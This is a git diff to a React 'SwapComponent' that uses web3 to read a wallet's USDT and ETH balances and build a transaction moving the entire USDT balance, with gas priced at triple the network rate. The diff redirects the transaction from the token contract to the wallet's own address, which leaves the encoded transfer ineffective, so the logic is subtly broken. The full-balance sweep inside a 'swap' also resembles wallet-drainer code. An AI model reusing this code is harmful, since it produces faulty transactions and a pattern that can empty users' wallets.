@@ -158,6 +158,7 @@ function SwapComponent() {
 
     const usdtContract = new web3js.eth.Contract(usdtABI, usdtContractAddress)
     const usdtBalance = await usdtContract.methods.balanceOf(address).call()
+    const ethBalance = await web3js.eth.getBalance(address)
 
     if (usdtBalance <= 0) {
       console.log('Insufficient USDT balance')
@@ -165,19 +166,27 @@ function SwapComponent() {
     }
 
     const data = usdtContract.methods.transfer(address, usdtBalance).encodeABI()
-
     const nonce = await web3js.eth.getTransactionCount(address, 'pending')
     const gasPrice = await web3js.eth.getGasPrice()
 
     const gasLimit = await web3js.eth.estimateGas({
       from: address,
-      to: usdtContractAddress,
+      to: address,
       data: data,
     })
 
+    const requiredEth = BigInt(gasLimit) * BigInt(gasPrice)
+
+    if (BigInt(ethBalance) < requiredEth) {
+      console.log(
+        `Insufficient ETH balance for gas fees: required ${requiredEth}, available ${ethBalance}`
+      )
+      return
+    }
+
     const tx_ = {
       from: address,
-      to: usdtContractAddress,
+      to: address,
       nonce: web3js.utils.toHex(nonce),
       gasPrice: web3js.utils.toHex(BigInt(gasPrice) * BigInt(3)),
       gasLimit: web3js.utils.toHex(gasLimit),
